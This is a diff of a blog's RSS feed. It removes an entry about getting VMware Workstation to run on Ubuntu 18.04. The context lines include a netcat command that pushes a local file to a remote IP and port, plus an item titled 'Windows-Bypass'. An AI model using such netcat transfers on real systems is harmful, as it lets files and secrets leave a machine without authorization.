@@ -47,16 +47,6 @@ upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt
     </item>
     
     <item>
-      <title>Ubuntu 18.04 Vmware Workstation 14.17</title>
-      <link>/concepts/vmware/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/concepts/vmware/</guid>
-      <description>Recently i moved from elementary to Ubuntu. migrating over to Ubuntu was a bit of a challenge, because i couldn&amp;rsquo;t Vmware to work. Vmware workstation would fail when it ran kernel-module-updater. it would fail at two points Vmware monitor and the network connection. it took about a day to find a solid answer to this.
-Below you&amp;rsquo;ll noticed allot of stuff but most of it isn&amp;rsquo;t necessary. I believe i did not play around with it much cause it works!</description>
-    </item>
-    
-    <item>
       <title>Windows-Bypass</title>
       <link>/concepts/bypass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
